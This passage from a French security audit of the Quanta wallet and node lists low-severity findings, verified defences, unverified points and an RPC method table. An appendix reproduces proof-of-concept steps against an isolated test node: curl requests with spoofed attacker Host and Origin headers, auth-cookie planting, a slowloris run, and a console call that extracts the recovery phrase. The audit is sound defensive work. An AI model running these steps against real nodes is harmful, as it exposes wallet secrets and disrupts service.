### A15 — BAS — `esc()` incomplet et test de non-régression trop étroit
**Ancres** : `src-tauri/src/explorer.html:116`, `src-tauri/src/rpc.rs:883-888`.

```js
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({...}[c]));   // explorer.html:116
```
Ni `'` ni le backtick ne sont échappés. Aujourd'hui aucun attribut de l'explorateur n'utilise de
guillemets simples, donc **la défense tient** ; elle tient par coïncidence de style, pas par
construction.

Le garde-fou censé empêcher la régression H7 est :
```rust
assert!(!EXPLORER_HTML.contains("${short("), ...);   // rpc.rs:885
```
Il ne détecte qu'un motif littéral. Il ne verrait pas `${t.from}`, `${b.miner}`,
`${esc(a) + b}`, ni un `kvBox` alimenté par une valeur non échappée. Il donne une fausse
assurance sur un invariant qu'il ne vérifie pas.

**Correctif** : compléter `esc` (`'` → `&#39;`, `` ` `` → `&#96;`) et remplacer le test par un
contrôle qui extrait toutes les interpolations du `<script>` et exige que chacune soit soit
numérique, soit passée par `esc`.

---

### A16 — BAS — Aucun en-tête de sécurité sur les réponses RPC et explorateur (PROUVÉ)
**Ancres** : `src-tauri/src/rpc.rs:315-323` (`write_response`), `:325-333` (`write_html`).
Les deux n'émettent que `Content-Type`, `Content-Length`, `Connection`. Mesuré :
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 463
Connection: close
```
Pas de `Content-Security-Policy`, pas de `X-Content-Type-Options: nosniff`, pas de
`X-Frame-Options`/`frame-ancestors`, pas de `Cache-Control`. L'explorateur (`GET /`, servi sans
aucune authentification, `rpc.rs:347-351`) est donc encadrable en `<iframe>` par n'importe quelle
page, ce qui permet au minimum de détecter la présence d'un nœud Quanta sur `127.0.0.1:8645`.
L'absence de CSP signifie aussi qu'une éventuelle future injection dans l'explorateur ne serait
atténuée par rien.

---

### A17 — BAS (défaut de conception, sans risque) — toute `Origin`, même la sienne, est refusée
**Ancre** : `src-tauri/src/rpc.rs:214-218`.
```rust
if let Some(origin) = req.header("origin") {
    if !origin.trim().is_empty() { return Some("origine croisée refusée".into()); }
}
```
La spécification Fetch impose l'en-tête `Origin` sur **tout** `POST`, y compris même-origine.
Preuve :
```
POST / Origin: http://127.0.0.1:18645  Authorization: Bearer <cookie>  {"method":"sendtoaddress"}
→ {"error":{"code":-32001,"message":"origine croisée refusée"}}
```
Conséquence : **aucun** client navigateur — pas même l'explorateur embarqué servi sur cette
origine, pas même un futur portefeuille web local — ne peut utiliser les méthodes d'argent.
C'est une défaillance en position sûre (le CSRF est bloqué, cf. §4), donc ce n'est pas une
vulnérabilité ; mais le commentaire du code (« une origine même-origine ou absente est bien »)
décrit un comportement que le code n'a pas. À corriger avant de croire que la règle fait ce
qu'elle annonce.

---

### A18 — BAS — Mot de passe du portefeuille en variable d'environnement
**Ancre** : `src-tauri/src/bin/quanta-node.rs:42`. `QUANTA_WALLET_PASSWORD` finit dans l'historique
du shell, dans les fichiers d'unité systemd / plist launchd, et dans l'environnement du processus
(`/proc/<pid>/environ` sur Linux, lisible par root et par le même utilisateur). Préférer un fichier
en 0600, une invite interactive, ou un descripteur de fichier.

### A19 — BAS — Adresse du portefeuille journalisée au démarrage
**Ancre** : `src-tauri/src/bin/quanta-node.rs:54-61`. Observé littéralement dans mon journal :
`démarré — … addr=qta1metylmty4lnfgvrwyy8q7rt5aa8xqrj9kdd5rpn694ts6vapqg8q35tc86`.
Les journaux partent souvent dans des collecteurs tiers ; l'adresse de valeur d'un opérateur
n'a rien à y faire au niveau INFO.

### A20 — BAS — Montants en `f64` sur l'IPC
**Ancres** : `src-tauri/src/commands/wallet.rs:50-59`, `:62`, `:126`, `:149`.
`quanta_to_uqta` fait `(amount * 1e6).round()`. Le RPC, lui, est en µQTA entiers
(`rpc.rs:15-16` le revendique explicitement) — l'IPC ne l'est pas. Conséquence : le montant débité
peut différer du montant saisi d'un µQTA, et une saisie < 0,0000005 QUANTA est arrondie à 0 avant
d'atteindre le ledger. Les garde-fous existants (`is_finite`, `< 0.0`, plafond 1 000 000) sont
corrects ; c'est le type qui ne l'est pas. Aligner l'IPC sur des entiers µQTA.

### A21 — BAS/informationnel — le seul bloc `unsafe` du backend
**Ancre** : `src-tauri/src/guardian.rs:26-35`.
```rust
let Ok(ptr) = w.ns_window() else { return false };
if ptr.is_null() { return false; }
// SAFETY: main-thread only (run_on_main_thread caller); `ptr` is the live
// NSWindow owned by Tauri for the window's whole lifetime.
let ns: &NSWindow = unsafe { &*(ptr as *const NSWindow) };
ns.occlusionState().contains(NSWindowOcclusionState::Visible)
```
**Verdict : justifié et borné, aucun comportement indéfini identifié.** Le pointeur nul est testé
(`:29`), l'erreur de `ns_window()` est traitée (`:26`), la fenêtre absente aussi (`:23`), et la
prémisse « thread principal » est vraie : le seul appelant est
`guard.run_on_main_thread(move || { let _ = otx.send(window_occluded(&g2)); })` (`guardian.rs:85-87`).
La référence ne quitte pas la fonction et `NSWindow` est détenue par Tauri pendant toute la vie
de la fenêtre. Deux réserves mineures, sans exploitation connue : (a) `&*` produit une durée de
vie non bornée que rien n'ancre au type — un futur refactor qui ferait sortir la référence
créerait un usage après libération silencieux ; (b) aucun `retain`/`autoreleasepool`, on dépend
entièrement de l'invariant de propriété de Tauri. Un `unsafe { ptr.cast::<NSWindow>().as_ref() }`
suivi d'une utilisation immédiate, ou `Retained::retain(ptr.cast())`, lèverait les deux.

### A22 — BAS — Minimum de mot de passe incohérent
**Ancres** : `src-tauri/src/commands/identity.rs:28`, `:46`, `:207` (`< 8`) contre
`src/lib/Welcome.svelte:46` (`pass.length >= 10` + lettres et chiffres). Le front est une
suggestion, le backend est la règle — et il est plus faible. Voir A6 pour l'impact.

---

## 4) Ce qui est solide

Ces points ont été vérifiés et **tiennent** ; ils méritent d'être connus.

1. **Aucune XSS stockée dans `explorer.html`.** J'ai extrait et classé **les 37 interpolations**
   du `<script>` une par une. Toutes celles qui portent une donnée de chaîne passent par `esc()` :
   `esc(short(b.hash))` (`:147`), `esc(t.tx_type)`, `esc(short(t.from))`, `esc(short(t.to))`
   (`:177`), `esc(b.hash)`, `esc(b.prev_hash)`, `esc(b.miner)`, `esc(b.timestamp)` (`:179`),
   `esc(short(t.hash))` (`:189`), `esc(bal.address)` (`:192`), `esc(t.hash/tx_type/from/to/nonce/
   timestamp)` (`:199-203`), `esc(e.message)` (`:207`). Toutes les autres sont soit numériques
   (`fmtN`/`fmtQ`/`Number` — un `<img onerror>` y devient `NaN`), soit des littéraux du code, soit
   déjà échappées par l'appelant (`card` `:118`, `kvBox` `:167`). Le seul champ non échappé,
   `info.node_id` (`:137`), passe par `textContent`, pas `innerHTML`.
   **Réponse à la question posée : non, un pseudo `@<img onerror=…>` enregistré sur la chaîne ne
   s'exécute pas** — d'abord parce que l'explorateur n'affiche aucun pseudo (aucune méthode RPC ne
   les expose), ensuite parce que tous les champs de chaîne qu'il affiche sont échappés.
   Le correctif H7 est complet **pour le code tel qu'il est** ; voir A15 pour la fragilité du garde-fou.
2. **Aucune XSS stockée dans le frontend Svelte.** Les 17 `{@html}` du code portent exclusivement
   sur des chaînes i18n compilées (`i18n.generated.ts`, `i18n.svelte.ts` — constantes, pas de
   chargement distant), sur un SVG de QR généré localement à partir de la matrice
   (`Qr.svelte:9-18`, `qrcode-generator` n'interpole jamais `data` dans sa sortie) et sur le
   whitepaper importé au build via `?raw` et échappé par `escapeHtml`
   (`Whitepaper.svelte:16-26, 58, 89`). Toutes les données de chaîne et de réseau — y compris le
   `display_name` d'un pair, que `sanitize_display_name` (`p2p/gossip.rs:270-286`) ne nettoie
   **pas** du HTML — sont rendues par `{...}`, donc échappées par Svelte.
3. **La défense CSRF sur les méthodes d'argent tient.** PROUVÉ : une requête « simple » de
   navigateur (`Content-Type: text/plain`, `Origin: https://evil.example`) sur `sendtoaddress` est
   refusée `-32001 origine croisée refusée`. Le doublet exigence de `Content-Type: application/json`
   + refus de toute `Origin` (`rpc.rs:214-224`) ferme correctement le chemin décrit dans le
   commentaire de `rpc.rs:147-157`.
4. **La comparaison du jeton est réellement à temps constant.** `rpc.rs:228-234` : le
   court-circuit ne porte que sur la longueur (publique : `Bearer ` + 64 hex), puis un XOR/OR
   accumulé sur tous les octets. C'est correct.
5. **Zéro injection SQL.** Les cinq requêtes de `storage/db.rs` (`:58`, `:66`, `:89`, `:106`,
   `:122`) sont **toutes** paramétrées via `libsql::params![…]`. Aucun `format!`/`concat!` ne
   construit de SQL. Les seules chaînes concaténées (`:91`, `:111`, `:124`) le sont dans des
   **messages d'erreur**, pas dans le SQL. Le schéma est fixe et les migrations sont littérales.
6. **Aucun secret dans les journaux, les erreurs ou les diagnostics.** `commands/error.rs` mappe
   chaque échec utilisateur sur un code stable `err.<camelCase>` sans détail interne ; l'échec de
   déverrouillage biométrique est délibérément opaque (`identity.rs:441`, « don't reveal which
   layer failed »). La sonde `diag.ts:141-149` enveloppe `invoke` mais n'enregistre que le **nom**
   de la commande, sa durée et la taille de la réponse — **jamais les arguments** : le mot de passe
   passé à `unlock_identity` ne transite donc pas par le journal. Aucun `println!`/`dbg!` sur un
   secret. J'ai inspecté les 2 413 lignes du `ui-diag.log` réel de l'utilisateur : hachages,
   montants, erreurs JS — aucune graine, aucun mnémonique, aucun mot de passe.
7. **`sendrawtransaction` ne peut pas injecter de transaction forgée.** `rpc.rs:663-724` refuse
   les `TxType::Slash` (autorité par preuve de faute en bloc uniquement), refuse les expéditeurs
   synthétiques `NETWORK`/`ESCROW`, et fait passer la transaction par `VerifiedTx::new` — la même
   porte de signature que le dispatcher réseau. Le test `rpc.rs:926-965` prouve qu'un montant
   altéré est rejeté `-32003`.
8. **Fichiers sensibles correctement protégés (sauf la base).** `.cookie` et `node_key` sont créés
   en **0600** (mesuré). Le liage par défaut est **`127.0.0.1:8645`** (`quanta-node.rs:103`) et
   l'exposition publique est un choix explicite (`--rpc-addr` / `--public`). L'application de
   bureau **ne sert pas du tout** le RPC — toute la classe A3/A4/A5/A8 ne concerne que le démon.
9. **KDF et hygiène mémoire.** Argon2id 64 MiB / t=3 / p=4 (`security/cipher.rs:16`), backoff
   exponentiel anti-force-brute partagé par les chemins mot de passe et Touch ID
   (`lib.rs:63-96`, appliqué en `identity.rs:79`, `:360`), `zeroize` activé sur `bip39` et
   `ed25519-dalek` (Cargo.toml), et zeroize explicite des tampons intermédiaires
   (`identity.rs:213-226`, `:302-305`, `:416`, `:431-432`, `:472`).
10. **Pas de piège de configuration Tauri.** `withGlobalTauri` absent (donc désactivé),
    `dangerousRemoteDomainIpcAccess` absent, `dangerousDisableAssetCspModification` absent,
    aucune permission `shell:*`/`fs:*` accordée, updater avec clé publique minisign et endpoint
    HTTPS joignable (HTTP 200 vérifié). Une seule fenêtre, une seule capacité, `local: true`.
11. **Robustesse du parseur HTTP maison.** `MAX_HEADER = 16 KiB`, `MAX_BODY = 2 MiB`, délai global
    de 10 s, plafond de connexions, `Connection: close` systématique et une seule requête par
    connexion — ce qui ferme d'emblée la famille du HTTP request smuggling (pas de
    `Transfer-Encoding`, pas de keep-alive). Le plafond a toutefois l'effet de bord A5.
12. **`getmultisigaddress` refuse la troncature.** `rpc.rs:520-527` : le `u32::try_from` explicite
    et la borne `1 ≤ threshold ≤ clés distinctes` corrigent proprement le défaut décrit en
    commentaire ; le test `rpc.rs:1086-1112` compare la dérivation à celle du consensus.
13. **Le chemin d'envoi valide le checksum Bech32m** avant signature (`wallet.rs:67-69`,
    `WalletSend.svelte:87-95`), ce qui évite l'envoi vers une adresse valide-en-apparence.

---

## 5) Ce que je n'ai PAS pu vérifier, et pourquoi

1. **L'exécution réelle d'un `invoke` malveillant depuis le webview (A1, A2).** Je n'ai pas lancé
   l'application Tauri graphique : une compilation était en cours dans le répertoire `target`
   partagé et je n'avais pas de session graphique exploitable. La chaîne est établie par lecture
   d'invariants — le code de dispatch de `tauri-2.10.3` (`src/webview/mod.rs:1800-1829`) et les
   manifestes réellement générés dans `gen/schemas/` — ce qui est solide, mais ce n'est pas une
   démonstration à l'exécution. **Recommandation : le vérifier en 5 minutes avec un
   `console.log(await window.__TAURI_INTERNALS__.invoke("get_recovery_phrase"))` dans l'inspecteur.**
2. **La navigation du webview vers une origine distante.** La CSP ne pose ni `navigate-to` ni
   `form-action` ni `base-uri`, et aucun `on_navigation` n'est installé dans `lib.rs`. Si le
   webview peut être amené sur une page distante, celle-ci hériterait de l'IPC non protégée par
   l'ACL (A1). Je n'ai pas testé si Tauri 2.10.3 injecte `__TAURI_INTERNALS__` sur une origine
   distante dans cette configuration. **Non prouvé, à trancher.**
3. **Le coût réel du balayage `listtransactions` (A10).** Ma chaîne d'audit était à la hauteur 1 :
   je n'ai pas pu mesurer le temps par bloc ni observer la saturation des workers. L'invariant
   « aucun `await` dans la boucle, donc non annulable » est certain ; l'ampleur ne l'est pas.
4. **La course TOCTOU sur `.cookie` (A14).** Fenêtre de l'ordre de la microseconde ; je n'ai pas
   monté de processus concurrent pour la gagner. Le défaut de code est certain, l'exploitabilité
   pratique ne l'est pas.
5. **Le comportement du presse-papier (A12).** Dépend de `navigator.clipboard.readText()` dans
   WKWebView, que je n'ai pas pu exercer sans lancer l'interface. Je ne sais donc pas si la graine
   est effacée au bout de 45 s ou si elle y reste.
6. **La solidité de la résolution de conflit du registre `@pseudo` (A11).** `p2p/username.rs` est
   hors de mon périmètre. Je décris uniquement le défaut d'affichage côté portefeuille ; je ne me
   prononce ni pour ni contre la possibilité de détourner un pseudo sur le réseau.
7. **L'exposition du mot de passe dans `/proc/<pid>/environ` (A18)** n'a été raisonnée que sur le
   plan général : la machine d'audit est macOS, où `ps -E` exige des privilèges. Je n'ai pas
   quantifié le risque sur Linux.
8. **La force réelle du chiffrement du coffre.** Je n'ai pas audité `security/pq_vault.rs`,
   `security/cipher.rs`, `security/hybrid_crypto.rs` ni `security/mod.rs` (hors périmètre) : je
   n'ai lu que les paramètres Argon2id pour calibrer la sévérité de A6. La correction de
   l'usage d'AES-256-GCM (unicité des nonces, notamment) n'est **pas** couverte par cet audit.
9. **Tout le P2P, le consensus, le ledger, la finalité Casper-FFG, la DHT, iroh-gossip.** Hors
   périmètre, non regardés.
10. **Aucun test Rust jetable n'a été écrit.** Les instructions interdisaient de modifier des
    fichiers suivis par git, et un test aurait exigé soit une modification de `src/`, soit une
    recompilation complète de l'arbre de dépendances (iroh, aws-lc-rs, tauri) dans un
    `CARGO_TARGET_DIR` neuf. J'ai préféré des preuves **à l'exécution contre un nœud réel**
    (curl + sockets bruts + inspection des permissions sur disque), qui démontrent A3, A4, A5,
    A6, A8, A16 et A17 de façon plus directe qu'un test unitaire.

---

## Annexe A — Les 17 méthodes RPC, classées

Liste exhaustive obtenue à l'exécution (`listmethods` sur le nœud d'audit), croisée avec
`rpc.rs:408-426` (constante `METHODS`) et `rpc.rs:52-57` (`public_denied`).

| # | méthode | ancre | classe | jeton exigé ? | déverrouillage explicite ? |
|---|---------|-------|--------|---------------|----------------------------|
| 1 | `getinfo` | `rpc.rs:433` | lecture (fuit l'**adresse du portefeuille** du nœud + node_id) | **non** | s.o. |
| 2 | `getblockcount` | `rpc.rs:473` | lecture | **non** | s.o. |
| 3 | `getfinalityheight` | `rpc.rs:475` | lecture | **non** | s.o. |
| 4 | `getfinalityinfo` | `rpc.rs:480` | lecture | **non** | s.o. |
| 5 | `getvalidators` | `rpc.rs:491` | lecture | **non** | s.o. |
| 6 | `getmultisigaddress` | `rpc.rs:511` | lecture (dérivation pure, sans état) | **non** | s.o. |
| 7 | `getmempool` | `rpc.rs:539` | lecture | **non** | s.o. |
| 8 | `getblock` | `rpc.rs:546` | lecture | **non** | s.o. |
| 9 | `getbalance` | `rpc.rs:555` | lecture (solde d'une adresse arbitraire) | **non** | s.o. |
| 10 | `validateaddress` | `rpc.rs:568` | lecture (pure) | **non** | s.o. |
| 11 | `gettransaction` | `rpc.rs:580` | lecture | **non** | s.o. |
| 12 | `listtransactions` | `rpc.rs:609` | lecture (historique complet d'une adresse ; cf. A10) | **non** | s.o. |
| 13 | `listmethods` | `rpc.rs:431` | lecture (pure) | **non** | s.o. |
| 14 | `sendrawtransaction` | `rpc.rs:663` | **écriture** — applique au ledger local **et** diffuse ; ne détient pas de clé (la signature est celle de l'appelant) | **oui** | non pertinent (autorité = signature ML-DSA du tiers) |
| 15 | `getwalletinfo` | `rpc.rs:729` | lecture **du portefeuille local** (adresse, solde, enjeu) | **oui** | **non** |
| 16 | `getnewaddress` | `rpc.rs:748` | lecture **du portefeuille local** (adresse de réception) | **oui** | **non** |
| 17 | `sendtoaddress` | `rpc.rs:759` | **DÉPLACE DES FONDS** — signe avec la clé ML-DSA du nœud et diffuse | **oui** | **NON — c'est le constat A4** |

Synthèse : 13 méthodes de lecture **entièrement non authentifiées**, dont trois qui fuient des
données personnelles de l'opérateur (`getinfo`, `getbalance`, `listtransactions`) ; 1 méthode
d'écriture et 3 méthodes touchant au portefeuille protégées par le seul cookie ; **une seule
méthode déplace des fonds, et aucune n'exige de déverrouillage explicite**. En mode `--public`
(`rpc.rs:379-380`), les quatre méthodes de la colonne « jeton exigé » sont désactivées et il ne
reste que la lecture — c'est un mode sûr, correctement implémenté.

## Annexe B — Reproduction des preuves

```bash
# 1. Nœud d'audit isolé (aucune donnée réelle touchée)
export QUANTA_WALLET_PASSWORD='audit-passphrase-1234'
./target/debug/quanta-node --data-dir /tmp/qaudit_dd --rpc-addr 127.0.0.1:18645

# 2. A8 — lecture non authentifiée, Host arbitraire
curl -s -X POST http://127.0.0.1:18645/ -H 'Host: attacker.example' \
     -H 'Content-Type: text/plain' -H 'Origin: https://evil.example' \
     --data '{"jsonrpc":"2.0","id":1,"method":"getinfo"}'

# 3. §4.3 — le CSRF sur l'argent est bien bloqué
curl -s -X POST http://127.0.0.1:18645/ -H 'Content-Type: text/plain;charset=UTF-8' \
     -H 'Origin: https://evil.example' \
     --data '{"method":"sendtoaddress","params":{"address":"qta1…","amount_uqta":1}}'
#  -> {"error":{"code":-32001,"message":"origine croisée refusée"}}

# 4. A3 — plantation du cookie
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > /tmp/qaudit_dd/.cookie
chmod 0644 /tmp/qaudit_dd/.cookie   # puis redémarrer le nœud
curl -s -X POST http://127.0.0.1:18645/ -H 'Content-Type: application/json' \
     -H 'Authorization: Bearer AAAA…' --data '{"method":"getwalletinfo","id":1}'

# 5. A5 — slowloris : /tmp/qaudit_slow.py (128 sockets, en-tête complet, corps jamais envoyé)
python3 /tmp/qaudit_slow.py
```

---
*Audit réalisé sur la surface applicative locale uniquement. Le P2P, le consensus, le ledger et les
primitives cryptographiques n'ont pas été examinés et peuvent contenir des défauts plus graves.
Aucun fichier du dépôt n'a été modifié ; `git status` est propre.*
